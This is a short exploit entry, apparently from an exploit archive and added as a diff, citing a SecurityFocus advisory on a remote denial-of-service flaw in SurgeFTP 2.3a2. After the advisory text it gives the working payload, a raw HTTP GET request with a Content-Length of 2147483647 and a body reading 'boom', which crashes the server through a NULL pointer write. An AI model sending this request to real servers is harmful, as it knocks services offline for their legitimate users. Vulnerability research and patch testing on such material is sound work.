@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/27993/info
+
+SurgeFTP is prone to a remote denial-of-service vulnerability because it fails to perform adequately boundary checks on user-supplied input.
+
+Exploiting this issue will cause the server to copy data to a NULL pointer, which will crash the server, denying access to legitimate users.
+
+SurgeFTP 2.3a2 is vulnerable; other versions may also be affected.
+
+GET / HTTP/1.0
+Content-Length: 2147483647
+
+boom
